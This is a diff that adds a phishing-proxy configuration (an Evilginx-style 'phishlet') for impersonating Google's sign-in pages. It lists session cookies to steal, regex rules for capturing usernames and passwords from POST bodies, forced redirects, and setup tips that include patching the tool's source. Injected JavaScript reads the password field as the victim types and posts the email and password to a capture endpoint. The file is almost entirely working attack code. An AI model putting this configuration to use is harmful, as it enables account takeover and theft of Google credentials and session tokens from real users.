@@ -1,0 +1,241 @@
+author: '@DevSecAS'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</head>', replace: '<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script></head>', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+
+credentials:
+  username:
+    key: 'unenc_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_pwd'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+
+# https://accounts.google.com/_/signin/selectchallenge?hl=en&TL=AG7eRGB2-SZJFBR2JnUScncEPZlLcKjbvfkegVpvSE25DnahfIioRPDnf8tCIwGv&_reqid=77650&rt=j
+# https://accounts.google.com/_/signin/challenge?hl=en&TL=AG7eRGB5pPAqRiQLRWrxaZSQVNHcQGXcLXqPPxP-Dr6j-QYlITw9Y2zI-tEww6hl&_reqid=178518&rt=j
+# https://accounts.google.com/_/speedbump/changepassword?hl=en&TL=AG7eRGATorowZWWmA0AKwBrJhabhAmltjCD863PUmrEDR-2topZwstTMwNN4DrPL&_reqid=480805&rt=j
+# https://accounts.google.com/signin/v2/challenge/totp?TL=AG7eRGBWSdbSpQ551qdOTvSXtU4r-vdx4kL1oXRRsYSIkst7e5oAgamNdl7p_cSZ&checkConnection&checkedDomains=youtube&cid=3&dsh=S1460197271%3A1685122975455721&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&ifkv=Af_xneFG27KAOnwqSeQN9NIpI5fH3RQ6OUPs5qewn8vodtuvC_lGmRuqXNb87-Cq2OSSLZBDO1q8xQ&pstMsg=1
+
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      #- {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/challenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+
+
+# Make sure to set the redirection path after succesfull login, We can do that using below command
+# lures get-url 0 domain=https://myaccount.google.com
+
+
+
+# in file core/phishlet.go on line 909
+# replace line -  re, err := regexp.Compile("^" + d + "$")
+# with line -     re, err := regexp.Compile(d)
+
+js_inject:
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: ["/identifier" , "/"]
+    script: |
+
+      // make the post to our endpoint for it to capture
+      async function postEndpoint(details) {
+          console.log('details poster', details);
+          var email = details['email'];
+          var pass = details['pass'];
+          var detailString = 'unenc_email=' + email + '&unenc_pwd=' + pass;
+          console.log('detailString', detailString)
+          var result;
+          try {
+              result = await fetch(window.origin + `/v3/signin/_/AccountsSignInUi/data/batchexecute`, {
+                  method: 'POST',
+                  headers: {
+                    'content-type': 'application/x-www-form-urlencoded'
+                  },
+                  body: detailString
+              })
+          } catch (err) {
+              console.log(err)
+              return false;
+          }
+          return;
+      }
+
+      // Define the password xpath
+      var passwordElem = $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) ? $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) : null;
+
+      function updatePasswordElem() {
+          passwordElem = $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) ? $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) : null;
+          console.log('Updated the password element');
+      }
+
+      // update password element every second
+      setInterval(updatePasswordElem, 2000);
+
+
+      // detect the change in passwords so we know when to capture their details
+      function detectChangePass() {
+
+        var emailLabel = $(_x('/html/body/div[1]/div[1]/div[2]/div/c-wiz/div/div[1]/div/div[2]/div')) ? $(_x('/html/body/div[1]/div[1]/div[2]/div/c-wiz/div/div[1]/div/div[2]/div')) : null;
+
+        // detect change of the password element
+        if (passwordElem) {
+            $(passwordElem).on('input', function() {
+
+              console.log('Password found typing');
+
+              var passVal = $(this).val();
+
+              // Make sure the email label is not empty / found
+              if(emailLabel !== null) {
+
+                console.log('Email label is not empty - good');
+
+                // Make sure password is not empty
+                if(passVal.length >= 3) {
+
+                  var email = $('[name="identifier"]').val();
+                  var pass = passVal;
+
+                  var details = {
+                    'email': email,
+                    'pass': pass
+                  }
+
+                  console.log('details', details);
+
+                  postEndpoint(details).then(() => {
+                    console.log('Endpoint posted');
+                  })
+
+                }
+
+              } else {
+                console.log('Email label IS empty');
+              }
+
+            });
+        } else {
+            updatePasswordElem();
+        }
+
+      }
+
+      // Detect password change every 3 seconds
+      setInterval(detectChangePass, 1000);
+
+      // Gets the item in the xpath provided
+      function _x(STR_XPATH) {
+          var xresult = document.evaluate(STR_XPATH, document, null, XPathResult.ANY_TYPE, null);
+          var xnodes = [];
+          var xres;
+          while (xres = xresult.iterateNext()) {
+              xnodes.push(xres);
+          }
+          return xnodes;
+      }
+
+      //---------------------------------------------
+
+        function checkCookies() {
+        if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+  
+            // If all cookies are found
+            window.location.href = '{domain}';
+            }
+ 
+        if (window.location.href.includes('/CheckCookie')) {
+            // Redirect only if the URL contain '/CheckCookie'
+            window.location.href = '{domain}';
+        }
+        }
+
+        // Check cookies on page load
+        window.onload = function() {
+        checkCookies();
+        }
+
+        // Check cookies every 3 seconds
+        setInterval(function() {
+        checkCookies();
+        }, 3000);
+
+
+
+
+#  - trigger_domains: ['myaccount.google.com']
+#    trigger_paths: ['.*?']
+#    script: |
+#    
+#     (function () {
+#        'use strict';
+#        let subdomain = window.location.host.split('.')[0];
+#        if (subdomain == "myaccount") {
+#          window.location.host = "https://myaccount.{domain}";
+#        }
+#      }());
